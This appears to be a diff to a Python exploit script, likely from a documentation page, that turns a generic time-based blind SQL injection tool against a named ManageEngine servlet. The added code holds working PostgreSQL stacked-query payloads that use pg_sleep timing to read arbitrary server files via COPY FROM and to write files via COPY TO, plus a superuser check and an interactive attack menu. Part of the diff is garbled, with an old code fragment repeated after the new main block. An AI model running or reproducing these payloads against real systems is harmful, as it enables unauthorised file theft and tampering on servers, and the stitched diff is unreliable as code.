@@ -44,7 +44,7 @@ import sys
 
 # -----Config-----
 PROXY = "http://127.0.0.1:8080"
-BASE_URL = "https://test/vulnPath?vulnParam=1"
+BASE_URL = "https://manageengine:8443/servlet/AMUserResourcesSyncServlet?ForMasRange=1&userId=1"
 SLEEP_TIMER = 5
 TIMEOUT = 25
 THRESHOLD = 1.5  # Margin to account for network variance
@@ -96,7 +96,9 @@ def read_file(path: str):
         for ch in ALPHABET:
             ascii_val = ord(ch)
             payload = (
-                f"SELECT CASE WHEN (ascii(substr((SELECT content FROM pwned),{position},1))={ascii_val}) THEN pg_sleep({SLEEP_TIMER}) END;--"
+                f";+DROP+TABLE+IF+EXISTS+pwned;+CREATE+TEMP+TABLE+pwned+(content+TEXT);+"
+                f"COPY+pwned+FROM+$$" + path + "$$;+"
+                f"SELECT+CASE+WHEN+(ascii(substr((SELECT+content+FROM+pwned),{position},1))={ascii_val})+THEN+pg_sleep({SLEEP_TIMER})+END;--"
             )
 
             elapsed = send_payload(payload)
@@ -114,16 +116,63 @@ def write_file(path: str, content: str):
     print(f"[*] Attempting to write to: {path}")
     payload = f";COPY (SELECT $$" + content + "$$) TO $$" + path + "$$;--"
     elapsed = send_payload(payload)
-    if is_timed_response(elapsed):
-        print("[+] File write timing response detected")
-    else:
-        print("[-] Write may have failed")
+    print("[-] Command sent. Please confirm output with Read File function.")
 
 def detect_length(path, max_len=100):
     print(f"[*] Determining content length (max {max_len})...")
     for length in range(1, max_len + 1):
         payload = (
-            f";CREATE TEMP TABLE pwned (content TEXT); "
+            f";+DROP+TABLE+IF+EXISTS+pwned;+CREATE+TEMP+TABLE+pwned+(content+TEXT);+"
+            f"COPY+pwned+FROM+$$" + path + "$$;+"
+            f"SELECT+CASE+WHEN+(LENGTH((SELECT+content+FROM+pwned))={length}) "
+            f"THEN+pg_sleep({SLEEP_TIMER})+END;--"
+        )
+        elapsed = send_payload(payload)
+        if is_timed_response(elapsed):
+            print(f"[+] Detected length: {length}")
+            return length
+    print("[-] Failed to determine length.")
+    return None
+
+# -----Main Menu-----
+def main():
+    if not test_sql_injection():
+        print("[-] Initial SQLi test failed.")
+        return
+
+    if check_superuser():
+        print("[+] Superuser access confirmed!")
+    else:
+        print("[-] Not a superuser or check failed.")
+
+    while True:
+        print("\n=== Actions ===")
+        print("[1] Read file")
+        print("[2] Write to file")
+        print("[3] Attempt RCE (TODO)")
+        print("[4] Quit")
+        choice = input("Select an option: ").strip()
+
+        if choice == "1":
+            path = input("Enter full file path to read: ").strip()
+            if path:
+                read_file(path)
+        elif choice == "2":
+            path = input("Enter full file path to write to: ").strip()
+            content = input("Enter content to write: ").strip()
+            if path and content:
+                write_file(path, content)
+        elif choice == "3":
+            print("[!] RCE functionality not yet implemented.")
+        elif choice == "4":
+            print("Exiting.")
+            sys.exit()
+        else:
+            print("Invalid option. Try again.")
+
+if __name__ == "__main__":
+    main()
+TABLE pwned (content TEXT); "
             f"COPY pwned FROM $$" + path + "$$; "
             f"SELECT CASE WHEN (LENGTH((SELECT content FROM pwned))={length}) "
             f"THEN pg_sleep({SLEEP_TIMER}) END;--"
@@ -173,6 +222,5 @@ def main():
 
 if __name__ == "__main__":
     main()
-
 ```
 {% endcode %}
